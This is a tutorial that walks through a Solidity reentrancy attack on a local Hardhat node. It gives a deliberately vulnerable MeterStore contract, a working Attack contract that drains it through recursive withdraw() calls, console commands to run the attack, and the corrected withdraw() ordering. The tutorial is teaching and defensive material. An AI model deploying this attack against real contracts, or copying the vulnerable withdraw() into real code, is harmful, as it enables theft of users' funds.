# Hardhat reentrancy attack tutorial

## Introduction
The Reentrancy attack is one of the most destructive attacks in the Solidity smart contract. A reentrancy attack occurs when a function makes an external call to another untrusted contract. Then the untrusted contract makes a recursive call back to the original function in an attempt to drain funds. (https://hackernoon.com/hack-solidity-reentrancy-attack)

## Create a new Hardhat project
```shell
npx hardhat
```
Select "Create a basic sample project" from the menu. Choose the default values for the next configuration questions.

## Create the smart contract with the reentrancy vulnerability
First delete the contracts/Greeter.sol contract file that hardhat created.
Next create a new file named contracts/MeterStore.sol with the following code:

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

contract MeterStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send MTR");

        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

Create a new file named Attack.sol and paste the following code.

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "./MeterStore.sol";
import "hardhat/console.sol";

contract Attack {
    MeterStore public meterStore;

    constructor(address _meterStoreAddress) {
        meterStore = MeterStore(_meterStoreAddress);
    }

    receive() external payable {
      console.log("Received MTR");
        if (address(meterStore).balance >= 1 ether) {
            meterStore.withdraw();
        }
    }    

    function attack() external payable {
        require(msg.value >= 1 ether);
        meterStore.deposit{value: 1 ether}();
        meterStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

## Run a local node
```shell
npx hardhat node
```

## Deploy the contracts
Create a new file named scripts/deploy.js

```shell
npx hardhat run --network localhost scripts/deploy.js
```

## Run the hardhat console
```shell
npx hardhat console --network localhost
```

## Send MTR from accounts 1 & 2 to the MeterStore contract address from the command line
```shell
const MeterStore = await ethers.getContractFactory('MeterStore');
const meterStore = await MeterStore.attach('0x4826533B4897376654Bb4d4AD88B7faFD0C98528');

const [owner, acc1, accAttacker] = await ethers.getSigners();
await meterStore.connect(owner).deposit({value: ethers.utils.parseEther('1')});
await meterStore.connect(acc1).deposit({value: ethers.utils.parseEther('1')});

console.log('MeterStore balance: ' + await meterStore.getBalance());

const Attack = await ethers.getContractFactory('Attack');
const attack = await Attack.attach('0x99bbA657f2BbC93c02D617f8bA121cB8Fc104Acf');
console.log('Attack balance: ' + await attack.getBalance());
await attack.connect(accAttacker).attack({value: ethers.utils.parseEther('1')});

console.log('Attack balance: ' + await attack.getBalance());
console.log('MeterStore balance: ' + await meterStore.getBalance());
```

## Preventative Technique
As you can see the MeterStore contract balance is now 0. To avoid reentrancy attacks ensure all state changes happen before calling external contracts. The withdraw function in the MeterStore contract should be modified as follows:

```solidity
function withdraw() public {
  uint bal = balances[msg.sender];
  require(bal > 0);

  balances[msg.sender] = 0;
  (bool sent, ) = msg.sender.call{value: bal}("");
  require(sent, "Failed to send MTR");
}
```
